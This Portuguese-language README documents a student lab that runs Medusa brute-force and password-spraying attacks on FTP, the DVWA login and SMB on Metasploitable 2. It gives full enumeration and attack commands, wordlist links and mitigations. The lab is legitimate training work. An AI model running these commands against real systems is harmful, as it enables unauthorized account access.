#  Projeto: Auditoria de Segurança com Kali Linux, Medusa e Ambientes Vulneráveis

Este repositório apresenta a implementação prática de um laboratório de segurança ofensiva utilizando **Kali Linux**, **Medusa**, **Metasploitable 2** e **DVWA**, com foco em simulações de ataques de força bruta em diferentes serviços (FTP, Web e SMB) dentro de um ambiente totalmente controlado.  
O objetivo é compreender o funcionamento desses ataques, documentar os processos e construir um portfólio técnico profissional utilizando o GitHub.

---

## 📘 Objetivo do Projeto

Este projeto permite ao estudante:

- Entender ataques de força bruta em diversos protocolos;
- Utilizar o Kali Linux e a ferramenta Medusa para auditoria de segurança;
- Documentar processos técnicos de forma clara, objetiva e profissional;
- Identificar vulnerabilidades e propor medidas de mitigação;
- Utilizar o GitHub como portfólio técnico para exposição do trabalho.

---

## 🧰 Ferramentas Utilizadas

| Ferramenta | Finalidade |
|------------|------------|
| **Kali Linux** | Sistema operacional para testes de segurança |
| **Metasploitable 2** | Máquina propositalmente vulnerável |
| **DVWA** | Aplicação web vulnerável para treinamentos |
| **Medusa** | Ferramenta de brute force multiprotocolo |
| **Nmap** | Ferramenta de enumeração e varredura |
| **enum4linux** | Coleta de informações SMB |
| **smbclient** | Validação de credenciais SMB |
| **VirtualBox** | Virtualização das máquinas do laboratório |

---

## 🖥️ Configuração do Ambiente

Foi criado um ambiente virtual utilizando **VirtualBox**, com duas máquinas virtuais na rede:

Host-Only Adapter – 192.168.56.0/24

- **Kali Linux** → máquina atacante  
- **Metasploitable2** → máquina alvo  
- **DVWA** → disponível via Apache na Metasploitable

Todo o laboratório foi realizado em rede isolada, garantindo segurança e controle do ambiente.

---

## 🚀 Testes e Ataques Realizados

### 1️⃣ Validação de Conectividade

```bash
ping <ip_host>
```
Verifica disponibilidade e latência do alvo via ICMP.

### 2️⃣ Enumeração de Serviços com Nmap
```bash
nmap -sV -p 21,22,80,445,139 <ip_host>
```
```-sV``` → identifica versões dos serviços\
Foco em portas vulneráveis: FTP, SSH, HTTP, SMB

### 3️⃣ Ataque Brute Force em FTP com Medusa

Criação de wordlists simples:
```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```
Ataque:
```bash
medusa -h <ip_host> -U users.txt -P pass.txt -M ftp -t 6
```

### 4️⃣ Automação de Login Web (DVWA)

Acesso manual ao login:
```pearl
http://<ip_host>/dvwa/login.php
```

Ataque Medusa:
```bash
medusa -h <ip_host> -U users.txt -P pass.txt -M http \
 -m PAGE:'/dvwa/login.php' \
 -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
 -m 'FAIL=Login failed' -t 6
 ```

 ### 5️⃣ Password Spraying + Enumeração SMB

Enumeração com enum4linux:
```bash
enum4linux -a <ip_host> | tee enum4_output.txt
less enum4_output.txt
```

Criação de wordlists SMB:
```bash
echo -e "user\nmsfadmin\nservice" > smb_users.txt
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
```

Ataque SMB:
```bash
medusa -h <ip_host> -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```

Validação de credenciais:
```bash
smbclient -L //<ip_host> -U msfadmin
```
---
## 🔑 Wordlists Utilizadas e Referências

As wordlists utilizadas neste laboratório são simples e foram geradas manualmente.
Para wordlists profissionais e mais robustas:

**SecLists (mais completa do mundo)**
https://github.com/danielmiessler/SecLists

**RockYou.txt (clássica)**
https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

**CrackStation Wordlists**
https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm

---
## 🔒 Medidas de Mitigação

- Aplicação de políticas de complexidade de senha
- Implementação de bloqueio por tentativas falhas
- Uso de MFA em aplicações e serviços críticos
- Desabilitar serviços não utilizados (como FTP sem TLS)
- Utilizar protocolos seguros (SFTP / FTPS)
- Monitoramento ativo via SIEM e logs centralizados
---
## 📎 Documentação Oficial

**Kali Linux:** https://www.kali.org/docs/   
**Medusa:** http://foofus.net/goons/jmk/medusa/medusa.html   
**DVWA:** https://github.com/digininja/DVWA      
**Nmap:** https://nmap.org/book/man.html  
**enum4linux-ng:** https://github.com/cddmp/enum4linux-ng

---
## ⬇️ Downloads Úteis
| Software | Download |
|-------  |------------|
|Kali Linux|https://www.kali.org/get-kali/|
|Metasploitable 2|https://sourceforge.net/projects/metasploitable/files/|
|VirtualBox|https://www.virtualbox.org/wiki/Downloads|
---
## 📚 Licença

Este projeto é destinado exclusivamente para fins educacionais.
Distribuído sob a licença MIT.
